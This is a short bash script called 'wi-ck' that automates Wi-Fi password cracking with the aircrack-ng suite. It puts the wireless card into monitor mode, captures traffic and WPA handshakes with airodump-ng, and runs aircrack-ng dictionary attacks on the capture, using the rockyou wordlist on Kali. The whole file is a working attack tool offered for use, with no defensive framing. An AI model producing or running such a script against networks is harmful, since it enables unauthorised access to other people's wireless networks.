#! /bin/bash
hash aircrack-ng 2>/dev/null || { echo >&2 "[!]wi-ck requires aircrack-ng but it's not installed.  Aborting."; exit 1; }
hash xterm 2>/dev/null || { echo >&2 "[!]wi-ck requires xterm but it's not installed.  Aborting."; exit 1; }
if [ $# -gt 3 ]; then
	echo ==============================
	echo That is a way lot of arguments
	echo Type \'wi-ck --help\' for help
	echo ==============================
elif [ $1 == "-h" -o $1 == "--help" ]; then
	echo
	echo '           _            _'
	echo ' __      _(_)       ___| | __'
	echo ' \ \ /\ / / |_____ / __| |/ /'
	echo '  \ V  V /| |_____| (__|   <'
	echo '   \_/\_/ |_|      \___|_|\_\'
	echo
	echo wi-ck wifi cracking automation script
	echo 'Usage: wi-ck <path>'
	echo 'Saves the capture file to <path>'
	echo
	echo 'Arguments:'
	echo '--help, -h			Displays this help'
	echo '-s, --stop			Stop the monitor interface'
	echo '-c, --crack <wordlist> <capfile>	crack the capture file'
	echo '->(kali users: use -k or --kali instead of <wordlist> to use rockyou.txt.gz)'
	echo
elif [ "$1" == "-s" -o "$1" == "--stop" ]; then
	echo '[-]Stopping the monitor interface'
	echo =========
	airmon-ng stop wlan0mon
	echo =========
elif [ "$1" == "-c" -o "$1" == "--crack" ]; then
	if [ "$2" == "-k" -o "$2" == "--kali" ]; then
		if uname -a | grep -q 'kali'; then
	                echo '[+]Cracking the capture file'
        	        xterm -e aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz $3
		else
        		echo '[!]Sorry you are not running a kali distro'
			echo '[!]Please re-run the script and enter the path to the wordlist after --crack'
		fi
	else
		echo '[+]Cracking the capture file' "'$3'"
	        xterm -e aircrack-ng -w $2 $3
	fi
elif [ "$1" == "-v" -o "$1" == "--version" ]; then
	echo "wi-ck - wifi-crack version 0.0.2"
else
	echo '[+]Starting the monitor interface'
	echo =========
	airmon-ng start wlan0
	echo =========
	if [ "$1" == "" ];  then
		echo "[+]Dumping the traffic and handsakes to '/tmp/capture'"
		xterm -e airodump-ng wlan0mon -w /tmp/capture
	else
		echo '[+]Dumping the traffic and handshakes to' "'$1'"
		xterm -e airodump-ng wlan0mon -w $1
	fi
fi
